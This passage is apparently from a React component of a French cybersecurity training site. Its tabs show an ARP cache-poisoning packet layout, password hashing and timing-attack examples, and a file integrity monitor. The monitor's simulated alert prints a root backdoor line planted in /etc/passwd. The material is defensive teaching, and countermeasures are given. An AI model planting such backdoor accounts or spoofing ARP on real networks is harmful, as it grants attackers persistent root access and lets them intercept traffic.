                <div className="bg-[#121620] p-4 rounded-xl border border-[#232c3d] space-y-2 text-ivory-muted leading-relaxed">
                  <div className="text-emerald-400 font-bold">###[ Ethernet (Couche 2 OSI) ]###</div>
                  <div className="pl-4">
                    dst = {victimMac}<br />
                    src = {attackerMac}<br />
                    type = 0x0806 (ARP)
                  </div>

                  <div className="text-gold font-bold pt-2">###[ ARP (Couche 3 OSI) ]###</div>
                  <div className="pl-4">
                    hwtype = 0x1 (Ethernet)<br />
                    ptype = 0x800 (IPv4)<br />
                    hwlen = 6, plen = 4<br />
                    op = {arpOp === 1 ? "1 (who-has)" : "2 (is-at)"}<br />
                    hwsrc = <span className="text-red-400 font-bold">{attackerMac}</span><br />
                    psrc = <span className="text-red-400 font-bold">{gatewayIp}</span> (Usurpée)<br />
                    hwdst = {victimMac}<br />
                    pdst = {victimIp}
                  </div>
                </div>

                {arpInjected && (
                  <div className="p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-red-300 text-xs">
                    <strong>⚠️ Empoisonnement de Cache Actif :</strong> La machine {victimIp} associe désormais l&apos;adresse de sa passerelle ({gatewayIp}) à l&apos;adresse MAC de l&apos;attaquant ({attackerMac}). Tout le trafic transitera par l&apos;hôte MITM.
                  </div>
                )}
              </div>

              <div className="text-[11px] font-mono text-ivory-dim border-t border-[#1c222e] pt-3">
                <strong>Contre-mesure défensive :</strong> Activer Dynamic ARP Inspection (DAI) sur les switches managés et déployer des tables statiques (`arp -s 192.168.1.1 00:11:22:33:44:55`).
              </div>
            </div>
          </div>
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB 4: CRYPTO & TIMING ATTACKS */}
      {/* =================================================================== */}
      {activeTab === "crypto_hash" && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            <div className="lg:col-span-6 bg-[#12161f] p-6 rounded-2xl border border-[#222a38] space-y-4">
              <h3 className="text-xl font-bold text-ivory flex items-center space-x-2">
                <KeyRound className="w-5 h-5 text-gold" />
                <span>Générateur Cryptographique Sécurisé (PBKDF2)</span>
              </h3>
              <p className="text-xs text-ivory-muted leading-relaxed">
                Testez en direct la différence entre un hachage SHA-256 brut (rapide mais vulnérable aux attaques par dictionnaire GPU) et une dérivation étirée avec sel (PBKDF2-HMAC-SHA256, 600 000 itérations recommandées par l&apos;OWASP).
              </p>

              <div className="space-y-3 text-xs font-mono">
                <div>
                  <label className="text-ivory-dim block mb-1">Mot de passe en clair :</label>
                  <input
                    type="text"
                    value={cryptoPassword}
                    onChange={(e) => setCryptoPassword(e.target.value)}
                    className="w-full bg-[#0e1117] border border-[#222a38] rounded-xl px-3.5 py-2 text-xs text-ivory"
                  />
                </div>

                <div>
                  <label className="text-ivory-dim block mb-1">Sel Aléatoire (CSPRNG Salt) :</label>
                  <input
                    type="text"
                    value={cryptoSalt}
                    onChange={(e) => setCryptoSalt(e.target.value)}
                    className="w-full bg-[#0e1117] border border-[#222a38] rounded-xl px-3.5 py-2 text-xs text-ivory"
                  />
                </div>

                <div className="pt-2 space-y-3">
                  <div className="p-3 bg-[#0d1015] rounded-xl border border-[#1e2531]">
                    <span className="text-amber-400 font-bold block mb-1">SHA-256 Simple (Sans étirement temporel) :</span>
                    <span className="text-[11px] text-ivory-dim break-all">{sha256Hash}</span>
                  </div>

                  <div className="p-3 bg-[#0d1015] rounded-xl border border-[#1e2531]">
                    <span className="text-emerald-400 font-bold block mb-1">PBKDF2-HMAC-SHA256 + Salt (600k itérations) :</span>
                    <span className="text-[11px] text-emerald-300 break-all">{pbkdf2Hash}</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Timing Attack Explanation */}
            <div className="lg:col-span-6 bg-[#0c0f14] p-6 rounded-2xl border border-[#222a38] space-y-4">
              <h3 className="text-xl font-bold text-ivory flex items-center space-x-2">
                <Lock className="w-5 h-5 text-gold" />
                <span>Pourquoi l&apos;opérateur `==` est une Faille Critique</span>
              </h3>
              <p className="text-xs text-ivory-muted leading-relaxed">
                En Python standard, l&apos;opérateur d&apos;égalité classique `a == b` interrompt sa comparaison au premier caractère erroné. Cela permet à un attaquant distant de mesurer le temps de réponse (en microsecondes) pour déduire les octets du jeton d&apos;authentification un à un (Timing Attack).
              </p>

              <div className="p-4 bg-[#141822] rounded-xl border border-[#222b3b] space-y-3 font-mono text-xs">
                <div className="text-red-400 font-bold">❌ CODE VULNÉRABLE (Attaque par canal temporel) :</div>
                <pre className="text-ivory-dim bg-[#0b0e13] p-2.5 rounded border border-[#1a202b]">
{`def verifier_cle_api(cle_fournie: str) -> bool:
    # Faiblesse : s'arrête au premier octet incorrect
    return cle_fournie == SECRET_API_KEY`}
                </pre>

                <div className="text-emerald-400 font-bold pt-1">✅ CODE SÉCURISÉ (Temps constant O(1)) :</div>
                <pre className="text-emerald-300 bg-[#0b0e13] p-2.5 rounded border border-[#1a202b]">
{`import secrets

def verifier_cle_api(cle_fournie: str) -> bool:
    # Parcourt l'intégralité de la chaîne indépendamment des erreurs
    return secrets.compare_digest(cle_fournie, SECRET_API_KEY)`}
                </pre>
              </div>

              <div className="text-xs font-mono text-ivory-dim">
                <strong>Règle de DevSecOps RayLab :</strong> Ne comparez jamais de HMAC, jetons JWT, mots de passe ou signatures avec `==` dans vos routes d&apos;API !
              </div>
            </div>
          </div>
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB 5: SOC LOGS REGEX DETECTOR */}
      {/* =================================================================== */}
      {activeTab === "soc_logs" && (
        <div className="space-y-6">
          <div className="bg-[#12161f] p-6 rounded-2xl border border-[#222a38] space-y-4">
            <h3 className="text-xl font-bold text-ivory flex items-center space-x-2">
              <FileSearch className="w-5 h-5 text-gold" />
              <span>Analyseur Forensique de Flux de Journaux SOC (SIEM Regex)</span>
            </h3>
            <p className="text-xs text-ivory-muted leading-relaxed">
              Examine les requêtes d&apos;accès HTTP brutes pour détecter en direct les signatures d&apos;attaques web d&apos;après le modèle MITRE ATT&amp;CK et les recommandations OWASP.
            </p>

            <div className="space-y-3">
              {sampleLogs.map((log) => (
                <div
                  key={log.id}
                  className={`p-4 rounded-xl border font-mono text-xs transition-all ${
                    log.type === "CRITICAL"
                      ? "bg-red-500/10 border-red-500/40 text-red-200"
                      : log.type === "HIGH"
                      ? "bg-amber-500/10 border-amber-500/40 text-amber-200"
                      : log.type === "MEDIUM"
                      ? "bg-yellow-500/10 border-yellow-500/40 text-yellow-200"
                      : "bg-[#0f1218] border-[#222a38] text-ivory-dim"
                  }`}
                >
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-1.5">
                    <span
                      className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                        log.type === "CRITICAL"
                          ? "bg-red-500 text-white"
                          : log.type === "HIGH"
                          ? "bg-amber-500 text-black"
                          : log.type === "MEDIUM"
                          ? "bg-yellow-500 text-black"
                          : "bg-[#1f2634] text-ivory-dim"
                      }`}
                    >
                      {log.type}
                    </span>
                    <span className="text-xs font-bold text-ivory">{log.tag}</span>
                  </div>
                  <div className="break-all text-[11px]">{log.raw}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB 6: FILE INTEGRITY MONITOR (FIM) */}
      {/* =================================================================== */}
      {activeTab === "fim_monitor" && (
        <div className="space-y-6">
          <div className="bg-[#12161f] p-6 rounded-2xl border border-[#222a38] space-y-6">
            <div className="flex flex-wrap items-center justify-between gap-4">
              <div className="space-y-1">
                <h3 className="text-xl font-bold text-ivory flex items-center space-x-2">
                  <Lock className="w-5 h-5 text-gold" />
                  <span>Moniteur d&apos;Intégrité de Fichiers (FIM SHA-256)</span>
                </h3>
                <p className="text-xs text-ivory-muted">
                  Surveillance en continu des fichiers critiques d&apos;un serveur Linux pour contrer l&apos;injection de portes dérobées (Backdoors) ou la falsification de permissions.
                </p>
              </div>

              <div className="flex gap-2">
                <button
                  onClick={handleTamperFile}
                  disabled={fimTampered}
                  className="px-4 py-2 rounded-xl bg-red-500/20 hover:bg-red-500/30 border border-red-500/40 text-red-300 text-xs font-mono font-bold transition-all disabled:opacity-50"
                >
                  Injecter une Altération Hostile (/etc/passwd)
                </button>
                <button
                  onClick={handleResetFim}
                  className="px-4 py-2 rounded-xl bg-[#1a202c] hover:bg-[#232b3c] border border-[#2a3545] text-ivory text-xs font-mono font-bold transition-all"
                >
                  Rétablir l&apos;Intégrité (Reset)
                </button>
              </div>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-mono">
                <thead className="bg-[#0b0e13] text-ivory-dim uppercase text-[10px] tracking-wider border-b border-[#1c222e]">
                  <tr>
                    <th className="py-3 px-4">Fichier Surveillé</th>
                    <th className="py-3 px-4">Empreinte de Référence (Baseline)</th>
                    <th className="py-3 px-4">Empreinte Courante (Temps Réel)</th>
                    <th className="py-3 px-4">Statut d&apos;Intégrité</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-[#1b212d]">
                  {fimFiles.map((file) => (
                    <tr key={file.path} className="hover:bg-[#151a24]/50">
                      <td className="py-3 px-4 font-bold text-ivory">{file.path}</td>
                      <td className="py-3 px-4 text-ivory-dim font-mono text-[11px]">{file.baseline}</td>
                      <td className="py-3 px-4 font-mono text-[11px]">
                        <span className={file.status === "COMPROMISED" ? "text-red-400 font-bold" : "text-ivory-dim"}>
                          {file.current}
                        </span>
                      </td>
                      <td className="py-3 px-4">
                        <span
                          className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                            file.status === "VALID"
                              ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/40"
                              : "bg-red-500 text-white animate-pulse"
                          }`}
                        >
                          {file.status === "VALID" ? "INTACT" : "ALTÉRÉ / COMPROMIS"}
                        </span>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {fimTampered && (
              <div className="p-4 bg-red-500/15 border border-red-500/40 rounded-xl space-y-2 text-xs font-mono text-red-200">
                <div className="flex items-center space-x-2 font-bold text-red-400">
                  <AlertTriangle className="w-4 h-4" />
                  <span>ALERTE HIDS / SIEM : Déviation d&apos;empreinte détectée sur /etc/passwd !</span>
                </div>
                <p>
                  L&apos;attaquant a inséré la ligne : <code>backdoor:x:0:0::/root:/bin/bash</code> afin d&apos;obtenir un accès root persistant. Le moniteur FIM a levé un signal d&apos;incident de sévérité CRITIQUE en 2 ms.
                </p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Bottom Educational Callout */}
      <div className="bg-[#12161f] p-8 rounded-3xl border border-[#222a38] flex flex-col md:flex-row items-center justify-between gap-6">
        <div className="space-y-2">
          <h4 className="text-xl font-bold text-ivory">
            Prêt à approfondir ces notions dans les Cursus Complets ?
          </h4>
          <p className="text-xs text-ivory-muted max-w-2xl leading-relaxed">
            Découvrez nos 12 volumes structurés CyberPath 2026-2027, le Manuel Complet de Python et le cursus de Hacking Éthique avec des leçons exhaustives, des travaux dirigés et des projets concrets.
          </p>
        </div>
        <Link
          href="/paths"
          className="px-6 py-3 rounded-xl bg-gold hover:bg-gold-light text-[#101216] font-bold text-xs uppercase tracking-wider shadow-gold flex items-center space-x-2 shrink-0"
        >
          <span>Accéder aux Cursus</span>
          <ChevronRight className="w-4 h-4" />
        </Link>
      </div>
    </div>
  );
}
